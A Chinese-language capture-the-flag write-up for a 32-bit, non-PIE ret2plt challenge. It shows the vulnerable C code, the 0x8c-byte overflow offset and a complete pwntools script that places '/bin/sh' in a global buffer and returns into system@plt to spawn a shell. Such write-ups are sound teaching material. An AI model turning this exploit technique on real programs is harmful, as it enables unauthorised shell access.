# week20xPwn

## 题目简述

程序是 32 位、无 PIE 的 ret2libc/ret2plt 入门题。第一次 `read` 可向固定的全局 `.bss` 缓冲区写 8 字节；第二次 `read` 向 `0x80` 字节栈缓冲区写入最多 `0x100` 字节。程序本身调用过 `system`，所以存在可直接复用的 `system@plt`。

```c
char buf[8];

void func()
{
    char local[0x80];
    puts("Leave Your Name");
    read(0, local, 0x100);
}

int main()
{
    my_init();
    system("echo Welcome To Here,How to get the argument?");
    read(0, buf, 8);
    func();
}
```

## 解题过程

先把以 NUL 结尾的 `/bin/sh` 写入全局缓冲区。官方二进制中该地址为 `0x0804c00c`，可从第一次 `read` 的第二个参数交叉引用确认；由于未启用 PIE，远程地址相同。

调试得到栈缓冲区到返回地址的偏移是 `0x8c`。32 位 cdecl 调用栈依次布置为：

```text
system@plt
伪返回地址
指向 "/bin/sh" 的地址
```

完整利用脚本：

```python
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
global_buf = 0x0804C00C


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


io = start()
io.sendafter(b"argument?", b"/bin/sh\x00")

payload = flat(
    b"A" * 0x8C,
    elf.plt["system"],
    0,
    global_buf,
)
io.sendafter(b"Name", payload)
io.interactive()
```

成功返回 `system("/bin/sh")` 后即可在交互 shell 中读取 flag。

## 方法总结

- 核心技巧：先向固定可写地址放置命令字符串，再溢出返回地址调用 `system@plt`。
- 识别信号：程序有可控的全局写入、无 PIE，并已导入 `system`；栈上另有超长 `read`。
- 复用要点：32 位 cdecl 参数放在栈上，目标函数地址之后必须预留伪返回地址；全局地址应从官方二进制确认。
